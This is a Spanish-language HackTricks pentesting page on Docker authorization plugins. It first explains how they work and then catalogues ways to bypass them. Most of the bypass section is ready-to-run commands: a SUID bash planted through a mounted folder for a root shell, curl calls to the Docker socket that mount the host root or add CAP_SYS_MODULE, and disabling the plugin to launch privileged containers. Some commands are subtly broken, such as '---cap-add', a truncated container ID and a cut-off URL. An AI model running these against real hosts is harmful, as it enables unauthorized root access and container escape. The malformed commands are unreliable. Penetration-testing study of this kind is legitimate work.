<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!

- Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Comparte tus trucos de hacking enviando PRs al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>


El modelo de **autorización** predeterminado de **Docker** es de **todo o nada**. Cualquier usuario con permiso para acceder al demonio de Docker puede **ejecutar cualquier** comando de cliente de Docker. Lo mismo ocurre para los llamadores que utilizan la API de Engine de Docker para contactar con el demonio. Si necesita un **mayor control de acceso**, puede crear **plugins de autorización** y agregarlos a la configuración de su demonio de Docker. Usando un plugin de autorización, un administrador de Docker puede **configurar políticas de acceso granulares** para administrar el acceso al demonio de Docker.

# Arquitectura básica

Los plugins de autenticación de Docker son **plugins externos** que puede utilizar para **permitir/denegar** **acciones** solicitadas al demonio de Docker **dependiendo** del **usuario** que lo solicitó y la **acción** **solicitada**.

Cuando se realiza una **solicitud HTTP** al demonio de Docker a través de la CLI o mediante la API de Engine, el **subsistema de autenticación** **pasa** la solicitud al o los **plugins de autenticación** instalados. La solicitud contiene el usuario (llamador) y el contexto del comando. El **plugin** es responsable de decidir si **permitir** o **denegar** la solicitud.

Los diagramas de secuencia a continuación representan un flujo de autorización de permitir y denegar:

![Flujo de autorización permitir](https://docs.docker.com/engine/extend/images/authz\_allow.png)

![Flujo de autorización denegar](https://docs.docker.com/engine/extend/images/authz\_deny.png)

Cada solicitud enviada al plugin **incluye el usuario autenticado, las cabeceras HTTP y el cuerpo de la solicitud/respuesta**. Solo se pasa el **nombre de usuario** y el **método de autenticación** utilizado al plugin. Lo más importante es que **no se pasan** las **credenciales** o tokens de usuario. Finalmente, **no se envían todos los cuerpos de solicitud/respuesta** al plugin de autorización. Solo se envían aquellos cuerpos de solicitud/respuesta donde el `Content-Type` es `text/*` o `application/json`.

Para los comandos que pueden secuestrar la conexión HTTP (`HTTP Upgrade`), como `exec`, el plugin de autorización solo se llama para las solicitudes HTTP iniciales. Una vez que el plugin aprueba el comando, la autorización no se aplica al resto del flujo. Específicamente, los datos de transmisión no se pasan a los plugins de autorización. Para los comandos que devuelven una respuesta HTTP fragmentada, como `logs` y `events`, solo se envía la solicitud HTTP a los plugins de autorización.

Durante el procesamiento de la solicitud/respuesta, algunos flujos de autorización pueden necesitar hacer consultas adicionales al demonio de Docker. Para completar dichos flujos, los plugins pueden llamar a la API del demonio de manera similar a un usuario regular. Para habilitar estas consultas adicionales, el plugin debe proporcionar los medios para que un administrador configure políticas de autenticación y seguridad adecuadas.

## Varios plugins

Es responsabilidad suya **registrar** su **plugin** como parte del **inicio** del demonio de Docker. Puede instalar **múltiples plugins y encadenarlos**. Esta cadena puede ser ordenada. Cada solicitud al demonio pasa en orden a través de la cadena. Solo cuando **todos los plugins otorgan acceso** al recurso, se otorga el acceso.

# Ejemplos de plugins

## Twistlock AuthZ Broker

El plugin [**authz**](https://github.com/twistlock/authz) le permite crear un archivo **JSON** simple que el **plugin** leerá para autorizar las solicitudes. Por lo tanto, le brinda la oportunidad de controlar muy fácilmente qué puntos finales de API pueden alcanzar cada usuario.

Este es un ejemplo que permitirá que Alice y Bob puedan crear nuevos contenedores: `{"name":"policy_3","users":["alice","bob"],"actions":["container_create"]}`

En la página [route\_parser.go](https://github.com/twistlock/authz/blob/master/core/route\_parser.go) puede encontrar la relación entre la URL solicitada y la acción. En la página [types.go](https://github.com/twistlock/authz/blob/master/core/types.go) puede encontrar la relación entre el nombre de la acción y la acción.

## Tutorial de plugin simple

Puede encontrar un **plugin fácil de entender** con información detallada sobre la instalación y depuración aquí: [**https://github.com/carlospolop-forks/authobot**](https://github.com/carlospolop-forks/authobot)

Lea el archivo `README` y el código `plugin.go` para entender cómo funciona.

# Bypass de plugin de autenticación de Docker

## Enumerar acceso

Las principales cosas a verificar son **qué puntos finales están permitidos** y **qué valores de HostConfig están permitidos**.

Para realizar esta enumeración, puede **usar la herramienta** [**https://github.com/carlospolop/docker\_auth\_profiler**](https://github.com/carlospolop/docker\_auth\_profiler)**.**

## Ejecución no permitida de `run --privileged`

### Privilegios mínimos
```bash
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
```
### Ejecutando un contenedor y luego obteniendo una sesión privilegiada

En este caso, el administrador del sistema **prohibió a los usuarios montar volúmenes y ejecutar contenedores con la bandera `--privileged` o dar cualquier capacidad adicional al contenedor:**
```bash
docker run -d --privileged modified-ubuntu
docker: Error response from daemon: authorization denied by plugin customauth: [DOCKER FIREWALL] Specified Privileged option value is Disallowed.
See 'docker run --help'.
```
Sin embargo, un usuario puede **crear una shell dentro del contenedor en ejecución y otorgarle privilegios adicionales**:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu
#bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de

# Now you can run a shell with --privileged
docker exec -it privileged bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de bash
# With --cap-add=ALL
docker exec -it ---cap-add=ALL bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
# With --cap-add=SYS_ADMIN
docker exec -it ---cap-add=SYS_ADMIN bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
```
Ahora, el usuario puede escapar del contenedor usando cualquiera de las [**técnicas previamente discutidas**](./#privileged-flag) y **escalar privilegios** dentro del host.

## Montar carpeta con permisos de escritura

En este caso, el administrador del sistema **prohibió a los usuarios ejecutar contenedores con la bandera `--privileged`** o dar cualquier capacidad adicional al contenedor, y solo permitió montar la carpeta `/tmp`:
```bash
host> cp /bin/bash /tmp #Cerate a copy of bash
host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
docker container> chown root:root /host/bash
docker container> chmod u+s /host/bash
host> /tmp/bash
 -p #This will give you a shell as root
```
{% hint style="info" %}
Ten en cuenta que quizás no puedas montar la carpeta `/tmp`, pero puedes montar una **carpeta diferente que sea escribible**. Puedes encontrar directorios escribibles usando: `find / -writable -type d 2>/dev/null`

**¡Ten en cuenta que no todos los directorios en una máquina Linux admitirán el bit suid!** Para comprobar qué directorios admiten el bit suid, ejecuta `mount | grep -v "nosuid"`. Por ejemplo, por lo general, `/dev/shm`, `/run`, `/proc`, `/sys/fs/cgroup` y `/var/lib/lxcfs` no admiten el bit suid.

También ten en cuenta que si puedes **montar `/etc`** o cualquier otra carpeta **que contenga archivos de configuración**, puedes cambiarlos desde el contenedor de Docker como root para **abusar de ellos en el host** y escalar privilegios (tal vez modificando `/etc/shadow`).
{% endhint %}

## Punto de conexión de API no verificado

La responsabilidad del administrador del sistema que configura este plugin sería controlar qué acciones y con qué privilegios puede realizar cada usuario. Por lo tanto, si el administrador adopta un enfoque de **lista negra** con los puntos de conexión y los atributos, podría **olvidar algunos** que podrían permitir a un atacante **escalar privilegios**.

Puedes comprobar la API de Docker en [https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/#)

## Estructura JSON no verificada

### Vínculos en root

Es posible que cuando el administrador del sistema configuró el firewall de Docker, **olvidó algún parámetro importante** de la [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) como "**Binds**".\
En el siguiente ejemplo, es posible abusar de esta mala configuración para crear y ejecutar un contenedor que monta la carpeta raíz (/) del host:
```bash
docker version #First, find the API version of docker, 1.40 in this example
docker images #List the images available
#Then, a container that mounts the root folder of the host
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "Binds":["/:/host"]}' http:/v1.40/containers/create
docker start f6932bc153ad #Start the created privileged container
docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
#You can access the host filesystem
```
{% hint style="warning" %}
Observa cómo en este ejemplo estamos usando el parámetro **`Binds`** como una clave de nivel raíz en el JSON, pero en la API aparece bajo la clave **`HostConfig`**
{% endhint %}

### Binds en HostConfig

Sigue las mismas instrucciones que con **Binds en root** realizando esta **solicitud** a la API de Docker:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Binds":["/:/host"]}}' http:/v1.40/containers/create
```
### Montajes en la raíz

Siga las mismas instrucciones que con **Vínculos en la raíz** realizando esta **solicitud** a la API de Docker:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}' http:/v1.40/containers/create
```
### Montajes en HostConfig

Siga las mismas instrucciones que con **Vínculos en root** realizando esta **solicitud** a la API de Docker:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "HostConfig":{"Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}}' http:/v1.40/containers/cre
```
## Atributo JSON no verificado

Es posible que cuando el administrador del sistema configuró el firewall de Docker, **olvidó algún atributo importante de un parámetro de la [API](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList)** como "**Capabilities**" dentro de "**HostConfig**". En el siguiente ejemplo es posible abusar de esta mala configuración para crear y ejecutar un contenedor con la capacidad **SYS\_MODULE**:
```bash
docker version
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
docker start c52a77629a9112450f3dedd1ad94ded17db61244c4249bdfbd6bb3d581f470fa
docker ps
docker exec -it c52a77629a91 bash
capsh --print
#You can abuse the SYS_MODULE capability
```
{% hint style="info" %}
El **`HostConfig`** es la clave que generalmente contiene los **privilegios** **interesantes** para escapar del contenedor. Sin embargo, como hemos discutido anteriormente, tenga en cuenta que el uso de Binds fuera de él también funciona y puede permitirle evitar restricciones.
{% endhint %}

## Desactivando el Plugin

Si el **sysadmin** ha **olvidado** **prohibir** la capacidad de **desactivar** el **plugin**, ¡puedes aprovechar esto para desactivarlo por completo!
```bash
docker plugin list #Enumerate plugins

# If you don’t have access to enumerate the plugins you can see the name of the plugin in the error output:
docker: Error response from daemon: authorization denied by plugin authobot:latest: use of Privileged containers is not allowed.
# "authbolt" is the name of the previous plugin

docker plugin disable authobot
docker run --rm -it --privileged -v /:/host ubuntu bash
docker plugin enable authobot
```
Recuerda **volver a habilitar el plugin después de escalar**, o un **reinicio del servicio de Docker no funcionará**.

## Writeups de Bypass del Plugin de Autorización

* [https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/](https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/)

# Referencias

* [https://docs.docker.com/engine/extend/plugins\_authorization/](https://docs.docker.com/engine/extend/plugins\_authorization/)


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!

- Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)

- **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Comparte tus trucos de hacking enviando PR al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
